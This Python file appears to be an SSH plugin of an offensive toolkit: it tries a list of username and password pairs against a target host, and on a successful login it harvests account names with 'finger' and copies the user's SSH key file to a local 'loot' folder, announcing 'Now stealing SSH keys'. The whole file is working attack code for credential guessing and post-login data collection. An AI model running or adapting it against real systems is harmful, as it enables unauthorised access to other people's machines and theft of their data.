from hydra import Exploit
from util import Color
import sys, paramiko

class SSH(Exploit):
    def __init__(self):
        self.name = 'ssh'
        self.port = 22
    
    def get_usernames(self, ssh):
        ssh.invoke_shell()
        stdin, stdout, stderr = ssh.exec_command('finger')
        stdin.close()
        stdout.readline()

        usernames = []
        for line in stdout:
            toks = line.split(' ')
            loot = (toks[0], None)
            if loot not in usernames:
                usernames.append(loot)
        print(f"{Color.BGRN}Success.{Color.END} Usernames found: ", file=self.output)
        print(usernames, file=self.output)
        return usernames
    
    def get_sshkeys(self, ssh, ip_address, username):
        try:
            stdin, stdout, stderr = ssh.exec_command('cat ~/.ssh/id_rsa.pub')
        except:
            print(f"No SSH keys found.", file=self.output)
        else:
            keys_bytes = stdout.read()
            keys = keys_bytes.decode(encoding='UTF-8')
            with open(f"./data/{ip_address}_{username}_sshkey.txt", "w") as text_file:
                text_file.write(keys)
            print(f"{Color.BGRN}Success.{Color.END} SSH keys saved in Data folder.", file=self.output)
        finally:
            stdin.close()

    def getloot(self, ip_address, credentials):
        # try to log into ssh using credentials
        for c in credentials:
            print(f"Trying to SSH into IP address {ip_address} with:\n Username: {c[0]} and Password: {c[1]}", file=self.output)
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(ip_address, username=c[0], password=c[1])
            except paramiko.AuthenticationException:
                print(f'{Color.BRED}Authentification failed.{Color.END}', file=self.output)
                ssh.close()
            else:
                print(f'{Color.BGRN}Success.{Color.END} Now gathering all usernames.', file=self.output)
                usernames = self.get_usernames(ssh)
                
                print(f'Now stealing SSH keys.', file=self.output)
                self.get_sshkeys(ssh, ip_address, c[0])
                return usernames